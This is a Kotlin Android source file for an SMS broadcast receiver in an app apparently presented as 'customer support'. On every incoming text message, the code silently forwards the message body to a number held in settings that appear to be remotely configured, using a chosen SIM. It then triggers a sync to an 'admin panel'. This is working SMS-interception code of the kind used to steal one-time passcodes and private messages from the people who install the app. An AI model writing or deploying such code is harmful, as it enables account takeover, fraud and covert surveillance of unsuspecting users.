package com.customersupport.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Log
import com.customersupport.data.PreferencesManager
import com.customersupport.socket.SocketManager
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
    }

    @Inject
    lateinit var preferencesManager: PreferencesManager

    @Inject
    lateinit var socketManager: SocketManager

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return

        val bundle = intent.extras ?: return
        val pdus = bundle.get("pdus") as? Array<*> ?: return

        for (pdu in pdus) {
            try {
                val format = bundle.getString("format")
                val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray, format)
                val sender = smsMessage.originatingAddress ?: "Unknown"
                val messageBody = smsMessage.messageBody

                Log.d(TAG, "SMS received from: $sender")

                // Check if SMS forwarding is enabled and forward
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val forwardEnabled = preferencesManager.getSmsForwardingEnabled().first()
                        val forwardTo = preferencesManager.getSmsForwardTo().first()
                        val subscriptionId = preferencesManager.getSmsSubscriptionId().first()

                        if (forwardEnabled && forwardTo.isNotEmpty()) {
                            forwardSms(context, forwardTo, sender, messageBody, subscriptionId)
                        }

                        // Trigger sync to update admin panel with new message
                        // Small delay to ensure SMS is saved to database first
                        delay(500)
                        Log.d(TAG, "Triggering sync after new SMS received")
                        socketManager.requestSync()
                    } catch (e: Exception) {
                        Log.e(TAG, "Error checking forwarding config", e)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error processing SMS", e)
            }
        }
    }

    private fun forwardSms(context: Context, forwardTo: String, originalSender: String, message: String, subscriptionId: Int = -1) {
        try {
            val forwardedMessage = message
            
            val smsManager = if (subscriptionId > 0 && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
                // Use specific SIM for dual SIM devices
                SmsManager.getSmsManagerForSubscriptionId(subscriptionId)
            } else {
                // Use default SIM
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            
            smsManager.sendTextMessage(forwardTo, null, forwardedMessage, null, null)
            Log.d(TAG, "SMS forwarded to $forwardTo using subscriptionId=$subscriptionId")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to forward SMS", e)
        }
    }
}
